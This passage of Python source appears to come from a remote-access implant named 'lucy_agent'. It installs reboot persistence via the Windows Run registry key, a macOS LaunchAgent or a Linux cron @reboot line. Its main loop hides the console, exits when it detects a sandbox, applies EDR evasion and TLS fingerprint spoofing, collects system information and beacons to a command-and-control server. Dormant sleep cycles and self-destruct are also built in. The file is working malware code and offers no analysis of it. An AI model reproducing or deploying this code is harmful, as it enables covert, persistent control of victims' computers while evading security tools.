        except ImportError:
            logger.warning("TCP beacon module not available — falling back to HTTP.")
            run_http_loop(agent_id)
    else:
        logger.warning("Unknown transport '%s' — defaulting to WebSocket.", transport)
        run_websocket_loop(agent_id)


def _install_dormant_persistence(config: dict) -> None:
    """Install disk persistence so the dormant agent survives reboots.

    Uses the persistence module if available, otherwise falls back to
    direct registry/cron manipulation.
    """
    if not config.get("dormant_persist", True):
        return

    target = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    name = config.get("custom_name", "lucy_agent")
    system = platform.system()

    try:
        if system == "Windows":
            import winreg
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try:
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{target}" --dormant')
            finally:
                winreg.CloseKey(key)
            logger.info("Dormant: installed registry persistence (HKCU\\...\\Run\\%s)", name)
        elif system == "Darwin":
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/com.{name}.plist")
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.{name}</string>
  <key>ProgramArguments</key><array><string>{target}</string><string>--dormant</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><false/>
</dict></plist>"""
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            with open(plist_path, "w") as f:
                f.write(plist_content)
            logger.info("Dormant: installed launchd persistence (%s)", plist_path)
        else:
            # Linux: cron @reboot
            cron_line = f"@reboot {target} --dormant\n"
            import subprocess
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current = result.stdout if result.returncode == 0 else ""
            if name not in current:
                new_cron = current + cron_line
                subprocess.run(["crontab", "-"], input=new_cron, text=True)
                logger.info("Dormant: installed cron @reboot persistence")
    except Exception as exc:
        logger.warning("Dormant: persistence install failed: %s", exc)


def main() -> None:
    global _agent_id, _aes_key, _config, _stealth_controller, _offline_queue

    _config = load_config()

    if _config.get("hide_window", True):
        _hide_console()

    if not _check_expiry(_config):
        sys.exit(0)

    _startup_delay(_config)

    from core.stealth import StealthController
    _stealth_controller = StealthController(
        enabled=_config.get("stealth_mode", True),
        idle_threshold=_config.get("stealth_idle_threshold", 60),
        active_delay=_config.get("stealth_active_delay", 5),
    )

    from core.offline_queue import OfflineQueue
    _offline_queue = OfflineQueue()

    if _config.get("anti_analysis") and not anti_sandbox_check():
        logger.warning("Sandbox detected — exiting.")
        sys.exit(0)

    # --- Auto EDR evasion (stealth pack) ---
    _auto_evasion_setup(_config)

    # --- TLS fingerprint spoofing ---
    _apply_tls_profile(_config)

    sysinfo = collect_sysinfo()

    retry_count = 0
    max_retries = int(_config.get("max_reconnect", 10))
    while not _stop_event.is_set():
        try:
            _agent_id, _aes_key = perform_handshake(sysinfo)
            break
        except Exception as exc:
            retry_count += 1
            wait = min(60, 5 * retry_count)
            logger.warning(
                "Handshake attempt %d/%d failed: %s — retrying in %ds",
                retry_count, max_retries, exc, wait,
            )
            if retry_count >= max_retries:
                logger.error("Max handshake retries exceeded. Exiting.")
                sys.exit(1)
            _stop_event.wait(timeout=wait)

    # --- Dormant mode: install persistence, then sleep/wake cycle ---
    dormant = _config.get("dormant_mode", False)
    if dormant:
        _install_dormant_persistence(_config)
        sleep_min = int(_config.get("dormant_sleep_minutes", 30))
        while not _stop_event.is_set():
            try:
                logger.info("Dormant: waking up to check C2…")
                _select_transport(_config, _agent_id)
            except Exception as exc:
                logger.warning("Dormant: session error: %s", exc)
            finally:
                if _config.get("single_execution"):
                    sys.exit(0)
                if _config.get("self_destruct"):
                    _self_destruct()
            logger.info("Dormant: sleeping %d minutes…", sleep_min)
            _stop_event.wait(timeout=sleep_min * 60)
    else:
        try:
            _select_transport(_config, _agent_id)
        finally:
            if _config.get("single_execution"):
                logger.info("Single execution mode — exiting after first session.")
                sys.exit(0)
            if _config.get("self_destruct"):
                logger.info("Self-destruct requested — removing agent executable.")
                _self_destruct()


if __name__ == "__main__":
    # Handle --dormant CLI flag: force dormant mode on
    if "--dormant" in sys.argv:
        DEFAULT_CONFIG["dormant_mode"] = True
    try:
        main()
    except KeyboardInterrupt:
        _stop_event.set()
        sys.exit(0)
